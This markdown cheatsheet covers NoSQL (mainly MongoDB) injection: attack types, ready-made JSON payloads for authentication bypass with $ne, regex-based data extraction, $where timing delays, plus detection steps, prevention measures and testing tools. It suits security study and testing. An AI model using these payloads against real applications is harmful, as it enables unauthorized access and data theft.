# 🔥 NoSQL Injection Cheatsheet

## 🎯 What is NoSQL Injection?

**NoSQL injection** is a security vulnerability that allows attackers to manipulate unvalidated input into NoSQL database queries. This can lead to unauthorized access, data extraction, or modification.

- **Targets:** NoSQL databases like MongoDB, Firebase, CouchDB, or DynamoDB.
- **Key Difference:** NoSQL databases handle unstructured or semi-structured data using JSON-like syntax, making them prone to injection attacks involving malicious objects or operators.

---

## ⚡ Types of NoSQL Injection

### 1. **NoSQL Syntax Injection**
- Exploits the application's use of raw or concatenated input in NoSQL query syntax.
- **Example (MongoDB):**
  ```javascript
  db.users.find({ username: inputUsername });
  ```
- **Payload to Bypass Authentication:**
  - Inject an always-true condition:
    ```json
    { "$ne": null }
    ```
  - Final Query:
    ```javascript
    db.users.find({ username: { "$ne": null } });
    ```

---

### 2. **NoSQL Operator Injection**
- Injects MongoDB-specific operators (`$gt`, `$ne`, `$regex`, etc.) to manipulate queries.
- **Example:**
  - Application Code:
    ```javascript
    db.users.find({ username: userInput, password: passInput });
    ```
  - Payload:
    ```json
    { "$or": [{ "username": "admin" }, { "password": { "$ne": null } }] }
    ```
  - Final Query:
    ```javascript
    db.users.find({
      "$or": [
        { "username": "admin" },
        { "password": { "$ne": null } }
      ]
    });
    ```

---

### 3. **Exploiting NoSQL Syntax Injection to Extract Data**
- Manipulates conditions to extract sensitive data like field names or values.
- **Identifying Field Names:**
  - Use malformed inputs to trigger verbose error messages.
  - **Payload Example:**
    ```json
    { "username": { "$regex": ".*" } }
    ```
  - Observe returned data to infer field structure.

---

### 4. **Timing-Based NoSQL Injection**
- Exploits delays to infer information (similar to blind SQL injection).
- **Example:**
  - Application Code:
    ```javascript
    db.users.find({ username: input });
    ```
  - Inject a delay:
    ```json
    { "$where": "sleep(5000) || true" }
    ```
  - Observe response time to confirm vulnerability.

---

## 🔎 Detection Techniques

1. **Test for Syntax Injection:**
   - Input malicious JSON-like objects and observe behavior.
   - Example Input:
     ```json
     { "$ne": null }
     ```
   - Result: Successful injection if unintended data is returned or if behavior changes.

2. **Check Query Processing Behavior:**
   - Inject special characters (`{`, `}`, `$`, `"`, `null`) and observe responses.

3. **Confirm Conditional Behavior:**
   - Input payloads that modify query logic:
     ```json
     { "username": "admin", "$or": [ {}, { "password": { "$ne": null } } ] }
     ```
   - Observe whether access is granted or data is returned.

4. **Verbose Error Messages:**
   - Craft inputs that trigger parsing errors to reveal database internals.

---

## 🛠️ Exploitation Techniques

### 1. **Bypassing Authentication**
- **Payload:**
  ```json
  { "username": { "$ne": null }, "password": { "$ne": null } }
  ```

- **Explanation:**
  - `$ne`: "Not Equal" operator matches any value not equal to `null`.

---

### 2. **Exfiltrating Data**
- **Extracting Field Names:**
  - Exploit `$regex` or `$exists` to infer structure.
  - **Payload:**
    ```json
    { "username": { "$regex": ".*" } }
    ```

- **Extracting Field Values:**
  - Use `$where` or `$regex` with crafted payloads.
  - **Payload:**
    ```json
    { "username": { "$regex": "^admin" } }
    ```

---

### 3. **Using Timing Attacks**
- **Payload:**
  ```json
  { "$where": "function() { sleep(5000); return true; }" }
  ```
- **Explanation:**
  - MongoDB evaluates `$where` conditions, delaying execution.

---

### 4. **Injecting MongoDB Operators**
- **Injection to Dump Collections:**
  - Payload:
    ```json
    { "$or": [{ "username": "admin" }, { "username": { "$ne": null } }] }
    ```

---

## 🔐 Preventing NoSQL Injection

1. **Sanitize Inputs:**
   - Strictly validate and sanitize user input.
   - Reject or escape special characters (`$`, `{`, `}`, etc.).

2. **Use Parameterized Queries:**
   - Avoid concatenating raw input into queries.
   - Use database libraries or Object-Relational Mapping (ORM) frameworks.

3. **Apply Input Whitelisting:**
   - Only allow expected field values or data types.
   - Reject unexpected query operators (`$ne`, `$gt`, `$regex`).

4. **Restrict Database Privileges:**
   - Use least-privilege principles to minimize database account permissions.

5. **Disable Dangerous Features:**
   - For MongoDB, consider disabling `$where` and JavaScript execution.

6. **Monitor and Log Queries:**
   - Use tools to log and analyze database queries for suspicious patterns.

7. **Implement Rate Limiting:**
   - Prevent automated attacks by limiting request rates.

---

## 🛠️ Tools for NoSQL Injection Testing

| Tool          | Purpose                            | URL/Command                             |
|---------------|------------------------------------|-----------------------------------------|
| Burp Suite    | Manual NoSQL injection testing     | [Burp Suite](https://portswigger.net)   |
| NoSQLMap      | Automated NoSQL injection scanner  | [NoSQLMap](https://github.com/codingo/NoSQLMap) |
| wfuzz         | Payload fuzzing                   | `wfuzz -z file,wordlist.txt -u URL`     |
| MongoDB Shell | Manual testing and exploitation    | [MongoDB](https://www.mongodb.com)      |


